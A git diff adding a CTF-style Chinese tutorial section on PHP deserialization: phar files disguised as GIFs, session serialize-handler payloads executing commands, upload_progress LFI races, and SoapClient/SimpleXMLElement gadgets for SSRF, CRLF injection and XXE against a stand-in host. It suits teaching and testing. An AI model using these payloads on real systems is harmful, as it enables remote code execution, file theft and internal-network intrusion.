@@ -617,7 +617,7 @@ $b();
 
 #### __construct()
 
-> PHP 允许开发者在一个类中定义一个方法作为**构造函数**（__construct）。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作
+> PHP 允许开发者在一个类中定义一个方法作为 **构造函数**（__construct）。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作
 
 ```php
 <?php
@@ -652,7 +652,7 @@ C: 丁真
 
 #### __destruct()
 
-> PHP 有**析构函数**（__destruct）的概念，这类似于其它面向对象的语言，如 C++。**析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。**
+> PHP 有 **析构函数**（__destruct）的概念，这类似于其它面向对象的语言，如 C++。**析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。**
 
 ```php
 <?php
@@ -908,7 +908,7 @@ md5 绕过很简单，科学计数法及数组绕过都可以
 
 我们创建 BUU 类后，重新给 $this->correct 赋值成 $this->input 的值
 
-在 PHP 中，`&` 表示**引用赋值**，效果是：
+在 PHP 中，`&` 表示 **引用赋值**，效果是：
 
  两个变量或者属性同时指向同一块内存，**任何一方变化，另一方立刻同步变化**
 
@@ -2068,3 +2068,343 @@ O:7:"Noteasy":2:{s:10:"\00Noteasy\00a";s:15:"create_function";s:10:"\00Noteasy\0
 ```
 
 ![](https://pic1.imgdb.cn/item/6810301658cb8da5c8d2bb1a.png)
+
+
+## 进阶利用方式
+
+前面讲的都是代码里直接调用 `unserialize()` 的场景。但实际题目里经常找不到 `unserialize()`，这时候就要用到下面三种"间接触发"的打法：phar 反序列化、session 反序列化和原生类反序列化。
+
+### phar 反序列化
+
+#### phar 是什么
+
+phar（PHP Archive）是 PHP 的一种打包格式，可以把多个 PHP 文件打成一个 `.phar` 压缩包分发，类似于 Java 的 jar 包。一个 phar 文件由四部分组成：
+
+1. **stub**：phar 的引导代码，必须以 `__HALT_COMPILER(); ?>` 结尾。前面的内容可以随意——这就是关键，我们可以把 stub 部分伪装成一张正常的图片（比如 `GIF89a` 开头）来骗过文件上传的 MIME 检测。
+2. **manifest**：存放每个文件的元数据（metadata）。这里的元数据是被 `serialize()` 序列化过的。
+3. **contents**：被打包文件的原始内容。
+4. **signature**：签名（可选）。
+
+重点在第二部分：**PHP 在解析 phar 文件时，会把 manifest 里的 metadata 反序列化**。也就是说，只要我们能控制某个 phar 文件的 metadata（把恶意对象塞进去），再让服务器用 `phar://` 协议访问这个文件，就会触发反序列化——全程不需要 `unserialize()`。
+
+#### 触发条件
+
+- 目标存在可以控制的文件（通常通过文件上传把构造好的 phar 传上去）。
+- 目标代码存在接收文件路径的函数，且参数可控，能传 `phar://` 协议。
+- `phar` 扩展开启（默认开启），且 `phar.readonly=Off`（仅生成 phar 时需要，攻击目标不需要）。
+
+能触发反序列化的不只是 `file_exists()`，几乎所有接受路径的函数都可以，常见的有：
+
+```php
+file_exists('phar://uploads/test.jpg/a.txt');
+file_get_contents('phar://uploads/test.jpg/a.txt');
+file_put_contents('phar://uploads/test.jpg/a.txt', $data);
+fopen('phar://uploads/test.jpg/a.txt', 'r');
+copy('phar://uploads/test.jpg/a.txt', '/tmp/copy.txt');
+rename('phar://uploads/test.jpg/a.txt', '/tmp/renamed.txt');
+is_dir('phar://uploads/test.jpg');
+include 'phar://uploads/test.jpg/a.txt';
+```
+
+只要这些函数的参数里出现 `phar://` 且指向我们上传的文件，metadata 就会被反序列化，魔术方法随之触发。
+
+#### 构造 phar
+
+PHP 提供了 `Phar` 类来生成 phar 文件，配合 `setMetadata()` 写入恶意对象：
+
+```php
+<?php
+// 生成用的类定义，要与目标站点中的类名和属性名完全一致
+class Evil {
+    public $cmd = "cat /flag";
+}
+
+// phar 文件不能覆盖已存在的文件，先删掉
+@unlink("evil.phar");
+
+$phar = new Phar("evil.phar");
+$phar->startBuffering();
+
+// stub：伪装成 GIF 文件头，绕过 MIME 检测
+$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
+
+// 把恶意对象写进 metadata
+$obj = new Evil();
+$phar->setMetadata($obj);
+
+// 随便添加一个文件内容，必须有内容否则文件结构不完整
+$phar->addFromString("test.txt", "hello");
+
+$phar->stopBuffering();
+?>
+```
+
+运行后得到 `evil.phar`，把它重命名成 `evil.jpg` 再上传。因为 stub 部分是 `GIF89a` 开头，能过掉大部分基于文件头的类型检测（文件上传的绕过思路见「文件上传」章节）。
+
+注意几点：
+
+- 生成脚本要在 `php.ini` 里设置 `phar.readonly = Off`，或者用 `php -d phar.readonly=0 gen.php` 运行。
+- 类定义需要和目标站点一致（包括命名空间），否则反序列化出来的只是 `__PHP_Incomplete_Class`。
+- 如果目标对上传文件做了二次渲染（如用 GD 库 `imagecreatefromjpeg` 重新生成），phar 结构会被破坏，需要用"找一张被渲染后字节不变的图片"等进阶技巧，初学者先掌握基本场景即可。
+
+#### 例题思路
+
+看一个典型的组合题（假设题目提供源码）：
+
+```php
+<?php
+// upload.php：把上传文件存到 uploads/ 目录
+move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
+echo 'uploads/' . $_FILES['file']['name'];
+?>
+```
+
+```php
+<?php
+// check.php
+highlight_file(__FILE__);
+class Flag {
+    public $file;
+    public function __destruct() {
+        echo file_get_contents($this->file);
+    }
+}
+if (isset($_GET['path'])) {
+    if (file_exists($_GET['path'])) {
+        echo "file exists!";
+    }
+}
+?>
+```
+
+完整解题过程：
+
+1. 审代码发现 `check.php` 里 `file_exists()` 参数完全可控，且存在 `Flag::__destruct()` 这个危险魔术方法——这是典型的 phar 反序列化入口。
+2. 本地写生成脚本，把 `Flag` 类的 `$file` 设为 `/flag`，生成 phar 并改名为 `evil.jpg`。
+3. 通过 `upload.php` 上传 `evil.jpg`，得到路径 `uploads/evil.jpg`。
+4. 访问 `check.php?path=phar://uploads/evil.jpg/test.txt`。`file_exists()` 解析 phar 时反序列化 metadata，还原出 `Flag` 对象；脚本结束时对象销毁，`__destruct()` 读取并输出 `/flag`。
+
+这类题的本质是：**文件上传负责"送货"，文件操作函数负责"点火"**，两步配合才能完成反序列化。
+
+### session 反序列化
+
+#### session 的存储与 serialize_handler
+
+PHP 的 session 默认保存在文件里（如 `/var/lib/php/sessions/sess_xxxx`），内容就是把 `$_SESSION` 序列化后的字符串。序列化方式由 `session.serialize_handler` 决定，有三种：
+
+| handler | 存储格式示例 | 说明 |
+| --- | --- | --- |
+| `php` | `name\|s:5:"admin";` | 键名和值之间用竖线 `\|` 分隔 |
+| `php_binary` | `\x04name` + `s:5:"admin";` | 键名长度用二进制字节表示 |
+| `php_serialize` | `a:1:{s:4:"name";s:5:"admin";}` | 整个数组直接 `serialize()` |
+
+漏洞出在：**写入 session 和读取 session 用的是不同的 handler**。比如一个页面用 `php_serialize` 写入，另一个页面用默认的 `php` 读取。
+
+当用 `php` handler 读取时，`\|` 之前的部分会被当成"键名"，之后的部分才会被 `unserialize()`。所以如果我们能往 session 里写入一个以 `|` 开头的序列化字符串：
+
+```
+|O:4:"Evil":1:{s:3:"cmd";s:9:"cat /flag";}
+```
+
+`php_serialize` 会把它整体当作一个普通字符串存进去：
+
+```
+a:1:{s:4:"name";s:38:"|O:4:"Evil":1:{s:3:"cmd";s:9:"cat /flag";}";}
+```
+
+而 `php` handler 读取时，以第一个 `\|` 为分界，后面那串 `O:4:"Evil"...` 就被当成真正的序列化数据反序列化了——漏洞触发。
+
+#### 例题思路
+
+```php
+<?php
+// index.php —— 写入 session，使用 php_serialize
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+if (isset($_GET['name'])) {
+    $_SESSION['name'] = $_GET['name'];
+}
+?>
+```
+
+```php
+<?php
+// flag.php —— 读取 session，使用默认的 php handler
+session_start();
+class Evil {
+    public $cmd = 'echo "nothing";';
+    public function __destruct() {
+        eval($this->cmd);
+    }
+}
+?>
+```
+
+解题过程：
+
+1. 访问 `index.php?name=|O:4:"Evil":1:{s:3:"cmd";s:13:"system("id");";}`，session 文件里写入了带 `\|` 前缀的 payload。
+2. 访问 `flag.php`，它用 `php` handler 解析同一个 session 文件，把 `\|` 后的内容反序列化，`Evil::__destruct()` 中的 `eval()` 执行了我们的命令。
+
+如果题目把 payload 里的双引号转义了，可以改用十六进制字符串 `S:3:"\63\61\74"` 之类的写法绕过。
+
+#### session.upload_progress 配合 LFI
+
+前面的打法要求"能控制写入 session 的值"。如果没有这种接口，但存在 **文件包含** 漏洞，还有一个更通用的技巧：利用 `session.upload_progress`（PHP 5.4+ 默认开启）。
+
+原理：当 PHP 处理文件上传时，会把上传进度写进 session 文件，键名为 `upload_progress_123`（`123` 来自表单里 `PHP_SESSION_UPLOAD_PROGRESS` 字段的值），而这个字段的值是 **我们可控的**，且会被原样写进 session 文件。配合 LFI 包含这个 session 文件，就能执行代码。
+
+利用条件：
+
+- 目标存在 LFI（文件包含，见「文件包含」章节）。
+- 能拿到 `PHPSESSID`（自己带一个 Cookie 即可）。
+- `session.upload_progress.enabled = On`（默认开启）。
+
+构造一个上传表单（也可以直接用脚本发 multipart 请求）：
+
+```html
+<form action="http://target/index.php" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS"
+           value="<?php phpinfo(); ?>" />
+    <input type="file" name="file" />
+    <input type="submit" />
+</form>
+```
+
+上传后，session 文件 `/var/lib/php/sessions/sess_<PHPSESSID>` 中会包含：
+
+```
+upload_progress_123|a:5:{...s:8:"value";s:18:"<?php phpinfo(); ?>";...}
+```
+
+然后包含它：
+
+```
+http://target/index.php?file=/var/lib/php/sessions/sess_<PHPSESSID>
+```
+
+即可执行 `phpinfo()`。注意两点：
+
+- session 文件在上传处理完成后可能被清理（`session.upload_progress.cleanup = On` 时），实际比赛常用 **条件竞争**：一边不停上传，一边不停包含。
+- session 内容会经过 `urlencode` 式的转义处理，`<?php phpinfo(); ?>` 这类短标签通常不受影响，但复杂 payload 可能需要 base64 编码后用 `php://filter` 解码。
+
+### 原生类反序列化
+
+前面的利用都要求目标代码里定义了带有危险魔术方法的类。如果目标没有定义任何可用类，还有一条路：**利用 PHP 内置的原生类**。这些类不需要题目定义，反序列化时可以直接还原。
+
+#### 用 Error / Exception 绕过哈希比较
+
+`Error` 和 `Exception` 类在比较时会把完整报错信息（含文件路径、行号）转成字符串。当题目用 `md5($a) === md5($b)` 之类比较两个对象时，构造两个内容完全相同的 `Exception` 对象即可绕过，常用于 `__wakeup()` 里的校验绕过。
+
+#### SoapClient 打 SSRF / CRLF
+
+`SoapClient` 是 PHP 内置的 SOAP 客户端类，需要 `php-soap` 扩展。它有一个非常关键的行为：**调用一个不存在的方法时，会真正把 SOAP 请求发出去**（本质是 `__call()` 的实现里发起了 HTTP 请求）。
+
+```php
+<?php
+$a = new SoapClient(null, array(
+    'location' => 'http://127.0.0.1:8080/admin',
+    'uri'      => 'http://127.0.0.1:8080/'
+));
+$a->notExistFunction();   // 触发请求
+?>
+```
+
+当反序列化链的终点是"调用某个对象不存在的方法"（即触发 `__call`）时，把这个对象换成 `SoapClient`，就能向内网发起请求——这就是 SSRF（配合思路见「SSRF注入」章节）。
+
+更进一步，`user_agent` 参数可控且没有过滤换行，可以注入 CRLF 构造完整的 POST 请求：
+
+```php
+<?php
+$target = 'http://127.0.0.1/flag.php';
+$ua = "test\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+    . "Content-Length: 13\r\n\r\ntoken=ctfshow";
+$a = new SoapClient(null, array(
+    'location'   => $target,
+    'user_agent' => $ua,
+    'uri'        => 'test'
+));
+echo serialize($a);
+?>
+```
+
+反序列化后再想办法触发一次不存在方法的调用（很多题目的链里本身就有 `__call` 终点），`SoapClient` 就会带着我们伪造的头部访问内网接口。
+
+#### SimpleXMLElement 打 XXE
+
+`SimpleXMLElement` 的构造函数支持三个参数：XML 数据、选项、以及一个布尔值 `data_is_url`。当第三个参数为 `true` 时，第一个参数会被当作 URL 读取：
+
+```php
+<?php
+// 反序列化链触发 __construct 或 new 时
+$a = new SimpleXMLElement(
+    'http://evil.example/xxe.xml',
+    LIBXML_NOENT,   // 解析外部实体
+    true            // 把第一个参数当作 URL
+);
+?>
+```
+
+如果题目能在反序列化过程中实例化可控参数的类（比如通过 `__wakeup` 里的 `$class = new $this->className($this->arg1, $this->arg2, $this->arg3);`），就可以指定 `SimpleXMLElement` 发起 XXE 攻击，读取本地文件（XXE 的细节见「XXE注入」章节）。
+
+#### ZipArchive 删文件
+
+`ZipArchive::open()` 如果以 `ZipArchive::OVERWRITE` 方式打开一个不存在的文件，在某些版本下配合 `ZipArchive::FL_NOCASE` 等 flag 会产生副作用；更常见的是利用 `SplFileObject`、`DirectoryIterator` 等读目录/读文件的原生类。例如 `SplFileObject` 反序列化后被当作字符串输出时，可以读取目标文件内容，常用于"没有读取接口，只有 echo 对象"的场景。
+
+#### 例题思路（SoapClient 打内网）
+
+```php
+<?php
+highlight_file(__FILE__);
+class Show {
+    public $source;
+    public $str;
+    public function __toString() {
+        return $this->str->source;   // __get
+    }
+    public function __wakeup() {
+        echo $this->source;          // __toString
+    }
+}
+class Test {
+    public $p;
+    public function __get($key) {
+        $f = $this->p;
+        return $f();                 // __invoke
+    }
+}
+class Hello {
+    public $func;
+    public function __invoke() {
+        call_user_func([$this->func, 'hello']);  // 调用不存在的方法 → __call
+    }
+}
+unserialize($_GET['data']);
+?>
+```
+
+这条链的终点是 `call_user_func([$this->func, 'hello'])`——`hello` 方法不存在，如果 `$this->func` 是一个 `SoapClient` 对象，就会触发 `SoapClient::__call` 发出请求。构造 payload：
+
+```php
+<?php
+$soap = new SoapClient(null, array(
+    'location' => 'http://127.0.0.1/flag',
+    'uri'      => 'test'
+));
+$hello = new Hello();
+$hello->func = $soap;
+$test = new Test();
+$test->p = $hello;
+$show = new Show();
+$show->str = $test;
+$outer = new Show();
+$outer->source = $show;
+echo urlencode(serialize($outer));
+?>
+```
+
+调用链为 `__wakeup → __toString → __get → __invoke → SoapClient::__call`，最终向内网 `http://127.0.0.1/flag` 发起 SOAP 请求。由于 `SoapClient` 的请求回显一般看不到，实战中常配合 CRLF 注入把请求改成能带出数据的接口，或者打内网里"访问即执行"的端点。
+
+#### 小结
+
+- 找不到 `unserialize()` 时，想 phar 和 session；找不到可用类时，想原生类。
+- 做题前先确认环境：有没有 `phar`、`soap`、`libxml` 扩展，`session.serialize_handler` 是什么，`session.upload_progress` 是否开启——`phpinfo()` 页面往往就是题目故意给的。
